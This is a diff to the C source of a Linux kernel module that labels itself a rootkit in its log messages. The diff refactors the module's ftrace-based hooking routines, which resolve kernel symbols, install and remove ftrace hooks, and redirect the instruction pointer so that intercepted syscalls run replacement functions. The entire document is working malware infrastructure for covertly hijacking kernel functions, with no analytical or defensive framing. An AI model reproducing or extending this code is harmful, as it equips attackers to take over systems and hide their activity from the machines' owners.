@@ -20,14 +20,14 @@ unsigned long resolve_sym(const char* sym)
 
 int resolve_hook(ftrace_hook *hook)
 {
-    hook->symbol_addr = resolve_sym(hook->symbol_name);
-    if (!hook->symbol_addr) {
-        pr_info("[rootkit] - ERROR: resolve_hook couldn't resolve symbol: %s\n", hook->symbol_name);
+    hook->address = resolve_sym(hook->name);
+    if (!hook->address) {
+        pr_info("[rootkit] - ERROR: resolve_hook couldn't resolve symbol: %s\n", hook->name);
         return -ENOENT;
     }
 
     // Also store address with an offset for skipping __fentry prologue
-    hook->offset_symbol_addr = hook->symbol_addr + MCOUNT_INSN_SIZE;
+    *((unsigned long *)hook->original) = hook->address + MCOUNT_INSN_SIZE;
     return 0;
 }
 
@@ -46,7 +46,7 @@ static void hook_thunk(unsigned long ip,
 
     /* Skip the actual syscall by updating instruction pointer, making sure to skip the
     __fentry prologue to avoid infinite recursion */
-    regs->ip = hook->hook_addr;
+    regs->ip = (unsigned long)hook->function;
 }
 
 int install_hook(ftrace_hook *hook)
@@ -61,15 +61,15 @@ int install_hook(ftrace_hook *hook)
                 FTRACE_OPS_FL_RECURSION |
                 FTRACE_OPS_FL_IPMODIFY;
 
-    result = ftrace_set_filter_ip(&hook->ops, hook->symbol_addr, 0, 0);
+    result = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
     if (result) {
-        pr_info("[rootkit] - ERROR: couldn't set filter for %s\n", hook->symbol_name);
+        pr_info("[rootkit] - ERROR: couldn't set filter for %s\n", hook->name);
         return result;
     }
 
     result = register_ftrace_function(&hook->ops);
     if (result) {
-        pr_info("[rootkit] - ERROR: couldn't set hook function for %s\n", hook->symbol_name);
+        pr_info("[rootkit] - ERROR: couldn't set hook function for %s\n", hook->name);
         return result;
     }
 
@@ -79,5 +79,5 @@ int install_hook(ftrace_hook *hook)
 void remove_hook(ftrace_hook *hook)
 {
     unregister_ftrace_function(&hook->ops);
-    ftrace_set_filter_ip(&hook->ops, hook->symbol_addr, 1, 0);
+    ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
 }
